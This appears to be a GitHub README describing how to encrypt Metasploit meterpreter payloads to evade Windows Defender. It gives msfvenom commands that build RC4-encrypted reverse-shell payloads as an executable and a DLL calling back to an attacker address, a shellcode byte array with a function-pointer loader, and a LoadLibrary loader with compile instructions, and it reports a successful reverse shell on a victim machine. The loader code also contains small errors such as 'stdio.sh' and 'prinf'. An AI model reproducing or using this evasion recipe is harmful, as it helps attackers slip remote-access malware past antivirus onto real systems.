# metaploit-encrypted-payloads 
This repo documents encrypting metasploit payloads for Windows Defender evasion. This was adapted from the blog post [here](https://blog.rapid7.com/2018/05/03/hiding-metasploit-shellcode-to-evade-windows-defender/).

## Background
Windows defender uses two approaches, Client ML and Cloud ML. When Client ML fails to make a determination, it sends it to Cloud ML and that usually means we are screwed. Additionally, the creation of AMSI allows programs to scan data buffers in Windows Defender via API. PowerShell was modified to do this with `-Command` arguments which makes it much harder to abuse PowerShell now.

### Client ML
* Light Weight
* Hash Signatures
* Behavior Detection
* Heuristics
### Cloud ML
* Decision tree model
* Automatic Sample Submission (Configurable)
* Sample Based Analysis
* Dentenation Based Analysis

## Step 1 - Shell Code Encryption
Encryption of the shellcode a rest, generally will prevent signature based static analysis by windows defender. In my testing, I discovered that it still found encrypted meterpreter payloads indicating there is some metadata somewhere non-encrypted in the payload which is being used as a static signature. Reverse shells were found to bypass.
### Encryption Support
* AES256-CBC
* RC4
* XOR
* Base64
### Generate Encrypted Payload
```bash
# output as C to write custom loaded
ruby ./msfvenom -p windows/meterpreter/reverse_tcp LHOST=127.0.0.1 --encrypt rc4 --encrypt-key thisisakey -f c

# output as exe for ease of use
ruby ./msfvenom -p windows/meterpreter/reverse_tcp LHOST=127.0.0.1 --encrypt rc4 --encrypt-key thisisakey -f exe -o encrypted.exe
```
The above payloads, once decrypted can still be detected at runtime.
## Step 2 - Seperation
Seperate the loaders and stagers. Using `windows/shell_reverse_tcp` puts stage into the loader's code so it is more likely to be detected. Always use a stager, e.g. `windows/shell/reverse_tcp` so the loader just launches the stager.
### Example With Manual Loader
```C
unsigned char shellcode[] = 
"\x69\x77\xb9\xb0\x11\xec\xc7\x98\x4d\x48\x80\xb6\x57\x51\xb6"
"\x93\x5c\x0e\x42\x18\xc1\x17\x8e\xcc\xd4\x9b\xc7\xba\xbe\x81"
"\x74\xa5\xd1\xd4\xa1\x5f\x5e\xf4\x30\x59\x68\x4b\xd2\x91\x47"
"\xb7\x90\x51\xbb\x04\x90\x7a\x04\xcd\xe2\x53\xdc\x48\x53\x11"
"\x95\x7b\xdd\xc3\x86\x81\x38\x62\xaf\x75\xd6\x29\xe6\xb7\xce"
"\x88\x04\xc3\xfe\xef\xd4\x69\xd7\x71\x7d\x52\x77\x3d\x48\x2b"
"\x34\xeb\xa0\xe6\x51\x51\xe6\x92\xda\x31\xc6\x18\x63\xb7\x7c"
"\xd3\x8f\x6a\xe7\x06\x91\x06\x95\xaf\x68\xf1\x94\x02\xea\x35"
"\xd5\x84\x09\x7d\x77\x0f\xd4\xd0\x4e\x2b\x0a\x66\xc4\x07\xb4"
"\x65\xe9\xc7\xc7\x69\x4f\x63\x7f\x5f\x7a\x73\x49\x9c\xf9\xc5"
"\x75\xab\xc5\x8d\x95\x35\x57\x56\xbd\xb8\xa7\x25\x94\x25\x82"
"\x89\x1b\xcd\xe2\xdf\xae\xa5\x69\xc9\x05\x64\xb9\x49\x81\x09"
"\xc6\x0c\x53\xc9\x98\x42\x94\x11\x64\x04\xb6\x9c\xb3\x32\xd7"
"\xb5\x25\x58\xd3\xa6\x2a\x56\xf7\x47\x43\x60\x70\xd8\x96\xfc"
"\xbf\xfe\xc2\x1d\x5b\xc5\x2f\xc6\xa0\x4d\xfc\x3d\x54\xa0\xbe"
"\x18\xbe\x83\x87\x42\x0a\x75\x97\x09\x8a\xe8\xc2\x4d\xef\x00"
"\x71\x59\xad\x5f\xef\x55\x67\x9c\xaf\x49\xf4\xe4\x3f\x7e\xe1"
"\x30\xdc\x82\xf4\x1d\xbb\x0a\x8d\x8f\xf1\xe3\x03\xd8\x34\xa6"
"\xf2\xc6\x9c\x7b\xe1\x62\xa5\xd7\x0e\xe1\x7b\xe7\x8d\x18\x3d"
"\x07\xd7\xbd\x06\xac\xd3\x37\xf5\x97\xdc\x8b\x88\xb8\x89\xc3"
"\x09\xf7\xe0\x75\x14\x8d\x01\x29\xb2\xe5\x7f\x30\xef\x15\x5e"
"\xc5\xe1\xbc\xcb\x47\x41\x1e\xde\xab\xd1\xde\xae\x33\x29\xd1"
"\x0e\xb2\x25\x80\x9e\xa1\x58\x6f\x08\x7a\xa6";

// funcptr prototype
int (*func)();

// funcptr assignment to shellcode char array
func = (int (*)()) shellcode;

// this line causes the issue with AV - The execution
(int)(*func)();
```
The above code loads the stager shell code. In testing, it was discovered this technique is detected as malicious behavior by Defender. Likely, it sees the function pointer indirection and casting as suspicious. To get around, dynamically load a DLL.
### DLL Loading Example
Using `LoadLibrary` will seem less suspicious it seems and will be allowed by Defender.
#### Shell Code
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.220.129 LPORT=443 --encrypt rc4 --encrypt-key thisisakey -f dll -o shellcode.dll
```

#### Custom Loader
```C++
#include <stdio.sh>
#include <windows.h>

int main(void)
{
	HMODULE hMod = LoadLibrary("shellcode.dll");
	if( hMod == nullptr )
	{
		prinf("Failed to load DLL\n");
	}
	
	return 0;
}
```
Compile
```bash
i686-w64-mingw32-g++ loader.cpp -o loader.exe -static-libgcc -static-libstdc++
```

### Results
These two files, `loader.exe` and `shellcode.dll` where downloaded on the victim Windows machine and were launched via the commandline and a successful reverse shell was received in `metasploit`. These techniques seem good enough for now to bypass Windows defender.